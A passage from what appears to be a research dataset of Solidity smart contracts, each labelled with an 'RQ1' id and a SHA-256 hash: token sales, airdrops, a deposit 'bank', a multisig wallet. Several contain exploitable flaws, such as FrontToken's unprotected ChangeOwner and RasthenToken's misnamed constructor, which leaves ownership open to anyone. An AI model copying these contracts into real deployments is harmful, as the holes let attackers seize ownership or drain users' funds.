    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);
            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }
    function () external payable {
            getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        if (msg.value < minReq){
            toGive = value.sub(value);
        }
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_b589500e83ab

SHA-256 `f34224d9a40a80c1b93de095dfd50978ca55621ae9a989f4c13866ed6c3c3119`

```solidity
pragma solidity ^0.4.19;
interface token {
    function transfer(address receiver, uint amount) external;
}
contract FrontToken {
    string public name = "FrontierCoin";      
    string public symbol = "FRONT";           
    uint256 public decimals = 6;            
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    uint256 public totalSupply = 0;
    bool feed = false;
    uint256 constant valueFounder = 100000000000000000;
    uint256 constant valuePub = 100000000000000000;
    address owner = 0x0;
    bool public crowdsaleClosed = false;
    token tokenReward;
    uint256 public amountRaised;
    uint256 public tpe;
    function SetTPE(uint256 _value) public isOwner {
        tpe = _value;
    }
    function ToggleFeed(bool enabled) public isOwner {
        feed = enabled;
    }
    modifier isOwner {
        assert(owner == msg.sender);
        _;
    }
    modifier validAddress {
        assert(0x0 != msg.sender);
        _;
    }
    function ChangeOwner(address _newOwner) public {
        owner = _newOwner;
    }
    function FrontToken() public {
        owner = msg.sender;
        totalSupply = valueFounder + valuePub;
        balanceOf[msg.sender] = valueFounder;
        balanceOf[this] = valuePub;
        Transfer(0x0, msg.sender, valueFounder);
        Transfer(0x0, this, valuePub);
        tokenReward = token(this);
        tpe = 10000000;
    }
    function ToggleCrowdsale(bool enabled) public isOwner {
        crowdsaleClosed = enabled;
    }
    function () payable public {
        require(!crowdsaleClosed);
        uint ethAmount = msg.value;
        uint256 tokens = ethAmount * tpe / 0.000001 ether;
        balanceOf[msg.sender] += tokens;
        amountRaised += ethAmount;
        Transfer(this, msg.sender, tokens);
    }
    function transfer(address _to, uint256 _value) validAddress public returns (bool success) {
        if(feed) {
            uint256 fee = div(_value, 97);
            uint256 newValue = _value - fee;
            require(balanceOf[msg.sender] >= newValue);
            require(balanceOf[_to] + newValue >= balanceOf[_to]);
            balanceOf[msg.sender] -= newValue;
            balanceOf[_to] += newValue;
            Transfer(msg.sender, _to, newValue);
            balanceOf[owner] += fee;
            Transfer(msg.sender, owner, fee);
        }
        else {
            require(balanceOf[msg.sender] >= _value);
            require(balanceOf[_to] + _value >= balanceOf[_to]);
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            Transfer(msg.sender, _to, _value);
        }
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) validAddress public returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        require(allowance[_from][msg.sender] >= _value);
        balanceOf[_to] += _value;
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) validAddress public returns (bool success) {
        require(_value == 0 || allowance[msg.sender][_spender] == 0);
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function setName(string _name) isOwner public {
        name = _name;
    }
    function setSymbol(string _symbol) isOwner public {
        symbol = _symbol;
    }
    function burn(uint256 _value) public {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[0x0] += _value;
        Transfer(msg.sender, 0x0, _value);
    }
    function ethReverse(uint256 _value) isOwner public {
        owner.transfer(_value);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
```

## RQ1_f91e2b168fdf

SHA-256 `9033cc8155a3b937bbbc4042e1be1e6aa7f206af9755d7ff902c1bc533e8f0fd`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract AltcoinToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract RasthenToken is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "Rasthen Token";
    string public constant symbol = "RASTHEN";
    uint public constant decimals = 8;
    uint256 public totalSupply = 20000000000e8;
    uint256 public totalDistributed = 0;        
    uint256 public tokensPerEth = 200000000e8;
    uint256 public constant minContribution = 1 ether / 100; 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function Rasthen () public {
        owner = msg.sender;
        uint256 devTokens = 2500000000e8;
        distr(owner, devTokens);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= minContribution );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {
        AltcoinToken token = AltcoinToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_b0b75749d918

SHA-256 `c705143cbfb0f53d1f0225dcb5da7c8e4d75695dc43384efbc97f22552128f77`

```solidity
pragma solidity ^0.4.24;
contract Best_Bank_with_Interest {
    mapping(address => uint256) balances;
    mapping(address => uint256) term_deposit_end_block; 
    address thebank; 
    uint256 public minimum_deposit_amount; 
    uint256 public deposit_fee;     
    uint256 public contract_alive_until_this_block;
    uint256 public count_customer_deposits; 
    function Best_Bank_with_Interest() { 
        thebank = msg.sender;  
        minimum_deposit_amount = 250 ether;
        deposit_fee = 5 ether;
        contract_alive_until_this_block = 3000000; 
        count_customer_deposits = 0;
        term_deposit_end_block[thebank] = contract_alive_until_this_block;
    }
    function deposit() payable {
        if (msg.value < minimum_deposit_amount) throw; 
        if (balances[msg.sender] == 0) deposit_fee = 0 ether;  
        if ( msg.sender == thebank ){ 
            balances[thebank] += msg.value;
        }
        else { 
            count_customer_deposits += 1; 
            balances[msg.sender] += msg.value - deposit_fee;  
            balances[thebank] += deposit_fee; 
            term_deposit_end_block[msg.sender] = block.number + 30850; 
        }
    }
    function withdraw(uint256 withdraw_amount) {
        if (withdraw_amount < 10 ether) throw; 
        if ( withdraw_amount > balances[msg.sender]  ) throw; 
        if (block.number < term_deposit_end_block[msg.sender] ) throw; 
        uint256 interest = 1 ether;  
        if (msg.sender == thebank){ 
            interest = 0 ether;
        }
        if (interest > balances[thebank])   
            interest = balances[thebank];  
        balances[thebank] -= interest;  
        balances[msg.sender] -= withdraw_amount;
        if (!msg.sender.send(withdraw_amount)) throw;  
        if (!msg.sender.send(interest)) throw;         
    }
    function set_minimum_payment(uint256 new_limit) {
        if ( msg.sender == thebank ){
            minimum_deposit_amount = new_limit;
        }
    }
    function set_deposit_fee (uint256 new_fee) {
        if ( msg.sender == thebank ){
            deposit_fee = new_fee;
        }
    }
    function get_available_interest_amount () constant  returns (uint256) {
        return balances[thebank];
    }
    function get_term_deposit_end_date (address query_address) constant  returns (uint256) {
        return term_deposit_end_block[query_address];
    }    
    function get_balance (address query_address) constant  returns (uint256) {
        return balances[query_address];
    }
    function extend_life_of_contract (uint256 newblock){
        if ( msg.sender != thebank || newblock < contract_alive_until_this_block ) throw;
        contract_alive_until_this_block = newblock; 
        term_deposit_end_block[thebank] = contract_alive_until_this_block;
    }
    function close_bank(){
        if (contract_alive_until_this_block < block.number || count_customer_deposits == 0)
            selfdestruct(thebank); 
    }
    function () payable { 
        balances[thebank] += msg.value;
    }
}

```

## RQ1_3f952af67006

SHA-256 `2123580d36a9f3d3b54c1e09ed7064792ea923a75f7298cdc0310c53400140e2`

```solidity
pragma solidity ^0.4.24;
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract multiowned {
    struct PendingState {
        uint yetNeeded;
        uint ownersDone;
        uint index;
    }
    event Confirmation(address owner, bytes32 operation);
    event Revoke(address owner, bytes32 operation);
    event OwnerChanged(address oldOwner, address newOwner);
    event OwnerAdded(address newOwner);
    event OwnerRemoved(address oldOwner);
    event RequirementChanged(uint newRequirement);
    modifier onlyowner {
        if (isOwner(msg.sender))
            _;
    }
    modifier onlymanyowners(bytes32 _operation) {
        if (confirmAndCheck(_operation))
            _;
    }
    constructor(address[] _owners, uint _required) public {
        m_numOwners = _owners.length;
        for (uint i = 0; i < _owners.length; ++i)
        {
            m_owners[1 + i] = uint(_owners[i]);
            m_ownerIndex[uint(_owners[i])] = 1 + i;
        }
        m_required = _required;
    }
    function revoke(bytes32 _operation) external {
        uint ownerIndex = m_ownerIndex[uint(msg.sender)];
        if (ownerIndex == 0) return;
        uint ownerIndexBit = 2**ownerIndex;
        PendingState storage pending = m_pending[_operation];
        if (pending.ownersDone & ownerIndexBit > 0) {
            pending.yetNeeded++;
            pending.ownersDone -= ownerIndexBit;
            emit Revoke(msg.sender, _operation);
        }
    }
    function changeOwner(address _from, address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        if (isOwner(_to)) return;
        uint ownerIndex = m_ownerIndex[uint(_from)];
        if (ownerIndex == 0) return;
        clearPending();
        m_owners[ownerIndex] = uint(_to);
        m_ownerIndex[uint(_from)] = 0;
        m_ownerIndex[uint(_to)] = ownerIndex;
        emit OwnerChanged(_from, _to);
    }
    function addOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        if (isOwner(_owner)) return;
        clearPending();
        if (m_numOwners >= c_maxOwners)
            reorganizeOwners();
        if (m_numOwners >= c_maxOwners)
            return;
        m_numOwners++;
        m_owners[m_numOwners] = uint(_owner);
        m_ownerIndex[uint(_owner)] = m_numOwners;
        emit OwnerAdded(_owner);
    }
    function removeOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        uint ownerIndex = m_ownerIndex[uint(_owner)];
        if (ownerIndex == 0) return;
        if (m_required > m_numOwners - 1) return;
        m_owners[ownerIndex] = 0;
        m_ownerIndex[uint(_owner)] = 0;
        clearPending();
        reorganizeOwners(); 
        emit OwnerRemoved(_owner);
    }
    function changeRequirement(uint _newRequired) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        if (_newRequired > m_numOwners) return;
        m_required = _newRequired;
        clearPending();
        emit RequirementChanged(_newRequired);
    }
    function isOwner(address _addr) public view returns (bool) {
        return m_ownerIndex[uint(_addr)] > 0;
    }
    function hasConfirmed(bytes32 _operation, address _owner) public view returns (bool) {
        PendingState storage pending = m_pending[_operation];
        uint ownerIndex = m_ownerIndex[uint(_owner)];
        if (ownerIndex == 0) return false;
        uint ownerIndexBit = 2**ownerIndex;
        if (pending.ownersDone & ownerIndexBit == 0) {
            return false;
        } else {
            return true;
        }
    }
    function confirmAndCheck(bytes32 _operation) internal returns (bool) {
        uint ownerIndex = m_ownerIndex[uint(msg.sender)];
        if (ownerIndex == 0) return;
        PendingState storage pending = m_pending[_operation];
        if (pending.yetNeeded == 0) {
            pending.yetNeeded = m_required;
            pending.ownersDone = 0;
            pending.index = m_pendingIndex.length++;
            m_pendingIndex[pending.index] = _operation;
        }
        uint ownerIndexBit = 2**ownerIndex;
        if (pending.ownersDone & ownerIndexBit == 0) {
            emit Confirmation(msg.sender, _operation);
            if (pending.yetNeeded <= 1) {
                delete m_pendingIndex[m_pending[_operation].index];
                delete m_pending[_operation];
                return true;
            }
            else
            {
                pending.yetNeeded--;
                pending.ownersDone |= ownerIndexBit;
            }
        }
    }
    function reorganizeOwners() private returns (bool) {
        uint free = 1;
        while (free < m_numOwners)
        {
            while (free < m_numOwners && m_owners[free] != 0) free++;
            while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;
            if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)
            {
                m_owners[free] = m_owners[m_numOwners];
                m_ownerIndex[m_owners[free]] = free;
                m_owners[m_numOwners] = 0;
            }
        }
    }
    function clearPending() internal {
        uint length = m_pendingIndex.length;
        for (uint i = 0; i < length; ++i) {
            if (m_pendingIndex[i] != 0) {
                delete m_pending[m_pendingIndex[i]];
            }
        }
        delete m_pendingIndex;
    }
    uint public m_required;
    uint public m_numOwners;
    uint[256] m_owners;
    uint constant c_maxOwners = 250;
    mapping(uint => uint) m_ownerIndex;
    mapping(bytes32 => PendingState) m_pending;
    bytes32[] m_pendingIndex;
}
contract daylimit is multiowned {
    modifier limitedDaily(uint _value) {
        if (underLimit(_value))
            _;
    }
    constructor(uint _limit) public {
        m_dailyLimit = _limit;
        m_lastDay = today();
    }
    function setDailyLimit(uint _newLimit) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        m_dailyLimit = _newLimit;
    }
    function resetSpentToday() onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        m_spentToday = 0;
    }
    function underLimit(uint _value) internal onlyowner returns (bool) {
        if (today() > m_lastDay) {
            m_spentToday = 0;
            m_lastDay = today();
        }
        if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {
            m_spentToday += _value;
            return true;
        }
        return false;
    }
    function today() private view returns (uint) { return block.timestamp / 1 days; }
    uint public m_dailyLimit;
    uint public m_spentToday;
    uint public m_lastDay;
}
contract multisig {
    event Deposit(address from, uint value);
    event SingleTransact(address owner, uint value, address to);
    event MultiTransact(address owner, bytes32 operation, uint value, address to);
    event ConfirmationERC20Needed(bytes32 operation, address initiator, uint value, address to, ERC20Basic token);
    event ConfirmationETHNeeded(bytes32 operation, address initiator, uint value, address to);
    function changeOwner(address _from, address _to) external;
}
contract Wallet is multisig, multiowned, daylimit {
    uint public version = 3;
    struct Transaction {
        address to;
        uint value;
        address token;
    }
    constructor(address[] _owners, uint _required, uint _daylimit)
            multiowned(_owners, _required) daylimit(_daylimit) public {
    }
    function kill(address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {
        selfdestruct(_to);
    }
    function() public payable {
        if (msg.value > 0)
            emit Deposit(msg.sender, msg.value);
    }
    function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {
        if (underLimit(_value)) {
            emit SingleTransact(msg.sender, _value, _to);
            _to.transfer(_value);
            return 0;
        }
        _r = keccak256(abi.encodePacked(msg.data, block.number));
        if (!confirmETH(_r) && m_txs[_r].to == 0) {
            m_txs[_r].to = _to;
            m_txs[_r].value = _value;
            emit ConfirmationETHNeeded(_r, msg.sender, _value, _to);
        }
    }
    function confirmETH(bytes32 _h) onlymanyowners(_h) public returns (bool) {
        if (m_txs[_h].to != 0) {
            m_txs[_h].to.transfer(m_txs[_h].value);
            emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);
            delete m_txs[_h];
            return true;
        }
    }
    function transferERC20(address _to, uint _value, address _token) external onlyowner returns (bytes32 _r) {
        if (underLimit(_value)) {
            emit SingleTransact(msg.sender, _value, _to);
            ERC20Basic token = ERC20Basic(_token);
            token.transfer(_to, _value);
            return 0;
        }
        _r = keccak256(abi.encodePacked(msg.data, block.number));
        if (!confirmERC20(_r) && m_txs[_r].to == 0) {
            m_txs[_r].to = _to;
            m_txs[_r].value = _value;
            m_txs[_r].token = _token;
            emit ConfirmationERC20Needed(_r, msg.sender, _value, _to, token);
        }
    }
    function confirmERC20(bytes32 _h) onlymanyowners(_h) public returns (bool) {
        if (m_txs[_h].to != 0) {
            ERC20Basic token = ERC20Basic(m_txs[_h].token);
            token.transfer(m_txs[_h].to, m_txs[_h].value);
            emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);
            delete m_txs[_h];
            return true;
        }
    }
    function clearPending() internal {
        uint length = m_pendingIndex.length;
        for (uint i = 0; i < length; ++i)
            delete m_txs[m_pendingIndex[i]];
        super.clearPending();
    }
    mapping (bytes32 => Transaction) m_txs;
}
```

## RQ1_72646c925fa6

SHA-256 `bc9b60465092b45368d646511fe4c043f876d55050a054e06250144b5e87b8cf`

```solidity
pragma solidity ^0.4.17;
contract FastCashMoneyPlusPermissions {
  address public centralBanker;
  function FastCashMoneyPlusPermissions() public {
    centralBanker = msg.sender;
  }
  modifier onlyCentralBanker() {
    require(msg.sender == centralBanker);
    _;
  }
  function setCentralBanker(address newCentralBanker) external onlyCentralBanker {
    require(newCentralBanker != address(0));
    centralBanker = newCentralBanker;
  }
}
contract FastCashMoneyPlusBase is FastCashMoneyPlusPermissions {
  string public name = "FastCashMoneyPlus";
  string public symbol = "FASTCASH";
  uint8 public decimals = 18;
  function updateSymbol(string _newSymbol) external onlyCentralBanker returns (bool success) {
    symbol = _newSymbol;
    return true;
  }
}
contract FastCashMoneyPlusStorage is FastCashMoneyPlusBase {
  mapping (bytes32 => address) public routingCodeMap;
  mapping (address => uint) public balanceOf;
  bytes32[] public routingCodes;
  function FastCashMoneyPlusStorage() {
    bytes32 centralBankerRoutingCode = "electricGOD_POWERvyS4xY69R3aR$";
    routingCodes.push(centralBankerRoutingCode);
    routingCodeMap[centralBankerRoutingCode] = msg.sender;
  }
  function balanceOfRoutingCode(bytes32 routingCode) external returns (uint) {
    address _address = routingCodeMap[routingCode];
    return balanceOf[_address];
  }
  function totalInvestors() external returns (uint) {
    return routingCodes.length;
  }
  function createRoutingCode(bytes32 _routingCode) public returns (bool success) {
    require(routingCodeMap[_routingCode] == address(0));
    routingCodeMap[_routingCode] = msg.sender;
    routingCodes.push(_routingCode);
    return true;
  }
}
contract FastCashMoneyPlusAccessControl is FastCashMoneyPlusStorage {
  mapping (address => mapping (address => uint)) internal allowed;
  event Approval(address indexed _owner, address indexed _spender, uint _value);
  function approve(address _spender, uint _value) external returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) external constant returns (uint remaining) {
    return allowed[_owner][_spender];
  }
}
contract FastCashMoneyPlusSales is FastCashMoneyPlusAccessControl {
  uint256 public totalSupply;
  uint256 public fastCashBank;
  uint public creationDate;
  uint private constant oneWeek = 60 * 60 * 24 * 7;
  uint public USDWEI = 760000000000000;
  uint public referalBonus = 10;
  event Sale(address _address, uint _amount);
  function FastCashMoneyPlusSales() public {
    totalSupply = 1000000 * 10 ** uint256(decimals);
    fastCashBank = totalSupply;
    creationDate = now;
  }
  function updateUSDWEI(uint _wei) external onlyCentralBanker returns (bool success) {
    USDWEI = _wei;
    return true;
  }
  function updateReferalBonus(uint _newBonus) external onlyCentralBanker returns (bool success) {
    referalBonus = _newBonus;
    return true;
  }
  function weeksFromCreation() returns (uint) {
    return (now - creationDate) / oneWeek;
  }
  function getExchangeRate(uint _week, uint _value, uint _usdwei) public returns (uint) {
    uint __week;
    if (_week > 71) {
      __week = 71;
    } else {
      __week = _week;
    }
    uint extraAdj = 0;
    if (__week > 50) {
      extraAdj = __week - 50;
    }
    uint minAdj = 10;
    uint x = __week + decimals - (minAdj + extraAdj);
    uint n = _value * 4 * uint(10 ** x);
    uint d = ( _usdwei / uint(10 ** minAdj) ) * (uint(12 ** __week) / uint(10 ** extraAdj));
    return n / d;
  }
  function getCurrentExchangeRate() public returns (uint) {
    uint _week = weeksFromCreation();
    return getExchangeRate(_week, USDWEI, USDWEI);
  }
  function _makeSale() private returns (uint) {
    uint _week = weeksFromCreation();
    uint _value = msg.value;
    uint moneyBucks = getExchangeRate(_week, _value, USDWEI);
    require(moneyBucks > 0);
    require(fastCashBank >= moneyBucks);
    balanceOf[msg.sender] += moneyBucks;
    fastCashBank -= moneyBucks;
    centralBanker.transfer(msg.value);
    Sale(msg.sender, moneyBucks);
    return moneyBucks;
  }
  function buy(bytes32 _routingCode, bytes32 _referal) payable {
    uint moneyBucks = _makeSale();
    if (routingCodeMap[_routingCode] == address(0)) {
      bool routingCodeCreated = createRoutingCode(_routingCode);
      require(routingCodeCreated);
    }
    if (_referal[0] != 0) {
      uint referalFee;
      if (fastCashBank > (moneyBucks / referalBonus)) {
        referalFee = moneyBucks / referalBonus;
      } else {
        referalFee = fastCashBank;
      }
      address reference = routingCodeMap[_referal];
      if (reference != address(0)) {
        balanceOf[reference] += referalFee;
        fastCashBank -= referalFee;
      }
    }
  }
  function () payable {
    _makeSale();
  }
}
contract FastCashMoneyPlusTransfer is FastCashMoneyPlusSales {
  event Transfer(address indexed _from, address indexed _to, uint _value);
  function _transfer(
    address _from,
    address _to,
    uint _amount
  ) internal returns (bool success) {
    require(_to != address(0));
    require(_to != address(this));
    require(_amount > 0);
    require(balanceOf[_from] >= _amount);
    require(balanceOf[_to] + _amount > balanceOf[_to]);
    balanceOf[_from] -= _amount;
    balanceOf[_to] += _amount;
    Transfer(msg.sender, _to, _amount);
    return true;
  }
  function transfer(address _to, uint _amount) external returns (bool success) {
    return _transfer(msg.sender, _to, _amount);
  }
  function transferFrom(address _from, address _to, uint _amount) external returns (bool success) {
    require(allowed[_from][msg.sender] >= _amount);
    bool tranferSuccess = _transfer(_from, _to, _amount);
    if (tranferSuccess) {
      allowed[_from][msg.sender] -= _amount;
    } else {
      return false;
    }
  }
  function transferToAccount(bytes32 _toRoutingCode, uint _amount) external returns (bool success) {
    return _transfer(msg.sender, routingCodeMap[_toRoutingCode], _amount);
  }
  function transferRoutingCode(bytes32 _routingCode, address _to) external returns (bool success) {
    address owner = routingCodeMap[_routingCode];
    require(msg.sender == owner);
    routingCodeMap[_routingCode] = _to;
    return true;
  }
  function _transferFromBank(address _to, uint _amount) internal returns (bool success) {
    require(_to != address(0));
    require(_amount > 0);
    require(fastCashBank >= _amount);
    require(balanceOf[_to] + _amount > balanceOf[_to]);
    fastCashBank -= _amount;
    balanceOf[_to] += _amount;
    Transfer(msg.sender, _to, _amount);
    return true;
  }
  function transferFromBank(address _to, uint _amount) external onlyCentralBanker returns (bool success) {
    return _transferFromBank(_to, _amount);
  }
  function transferFromBankToAccount(bytes32 _toRoutingCode, uint _amount) external onlyCentralBanker returns (bool success) {
    return _transferFromBank(routingCodeMap[_toRoutingCode], _amount);
  }
}
contract FastCashMoneyPlus is FastCashMoneyPlusTransfer {
}
```

## RQ1_283c96463274

SHA-256 `42ac89d27285f9befd581ce56da12203c152fbe8c2d5ff1d46e24a5ebbb80e98`

```solidity
pragma solidity ^0.4.18;
contract KryptoArmy {
    address ceoAddress = 0x46d9112533ef677059c430E515775e358888e38b;
    address cfoAddress = 0x23a49A9930f5b562c6B1096C3e6b5BEc133E8B2E;
    modifier onlyCeo() {
        require (msg.sender == ceoAddress);
        _;
    }
    struct Army {
        string name;            
        string idArmy;          
        uint experiencePoints;  
        uint256 price;          
        uint attackBonus;       
        uint defenseBonus;      
        bool isForSale;         
        address ownerAddress;   
        uint soldiersCount;     
    } 
    Army[] armies;
    struct Battle {
        uint idArmyAttacking;   
        uint idArmyDefensing;   
        uint idArmyVictorious;  
    } 
    Battle[] battles;
    mapping (address => uint) public ownerToArmy;       
